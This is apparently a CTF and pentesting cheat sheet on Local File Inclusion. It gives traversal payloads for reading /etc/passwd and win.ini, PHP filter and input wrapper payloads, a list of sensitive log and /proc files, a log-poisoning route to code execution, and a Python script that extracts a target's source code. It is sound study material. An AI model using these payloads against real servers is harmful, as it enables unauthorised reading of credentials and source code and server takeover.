# Local File Inclusion (LFI)

## Purpose
Read local server configuration files, source code files, or log files, and occasionally escalate to remote code execution.

## Decision Tree
```
Is input file path loaded dynamically?
 ├── Yes -> Check for extension enforcement:
 │    ├── Enforced? -> Try null byte (PHP < 5.3) or path truncation
 │    └── No -> Request /etc/passwd or C:\Windows\win.ini
 └── Try PHP wrapper filters to extract source code directly
```

## Recon Checklist
- [ ] Inspect parameters fetching template files, languages, or pages (e.g. `page=home.php`, `file=about`).
- [ ] Determine backend OS environment.

## Detection Checklist
- [ ] Inject `../../../../etc/passwd` or `..\..\..\..\Windows\win.ini` and verify output.
- [ ] Check if directory traversal is sanitized (e.g. `../` stripped, try `....//`).

## Recon Workflow
1. Locate pages processing file paths.
2. Inject directory traversal sequences.
3. Check for specific application/system file outputs.

## Enumeration
- Retrieve system configs: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/proc/self/cmdline`.
- Identify web server logs for log poisoning opportunities: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/auth.log`.

## Useful Tools
- Burp Suite
- `scripts/dir_bruteforce.py`

## Quick Commands
*(None)*

## Linux Commands
*(None)*

## Common Payloads
```
../../../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input
```

## Exploitation Workflow
1. Find file path parameter.
2. Read system files to confirm LFI.
3. Use PHP filters (`php://filter/...`) to retrieve backend source files.
4. Target logs or processes (`/proc/self/environ`) to poison headers with php code and achieve code execution.

## Example CTF Scenario
A portal loads pages via `index.php?page=contact`. Using `php://filter/convert.base64-encode/resource=config.php` returns the base64-encoded source of the configuration file, revealing the database password.

## Python Automation Example
```python
import requests
import base64
# Auto extract page source code via LFI filter
url = "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index"
r = requests.get(url)
try:
    code = base64.b64decode(r.text.strip()).decode()
    print("[+] Extracted Source Code successfully:")
    print(code[:200] + "...")
except Exception:
    print("[-] Extraction failed or response is not base64.")
```

## Common Mistakes
- Using too few traversal steps (`../`). Use at least 8-10 steps to ensure you hit root directory.
- Not URL-encoding wrappers syntax inside GET arguments.

## CTF Tips
- If LFI is confirmed, check out page code to understand system logic.
- Look out for `/proc/self/fd/` directory entries for Apache file descriptors logs.

## References
- OWASP: LFI
- PayloadsAllTheThings: LFI
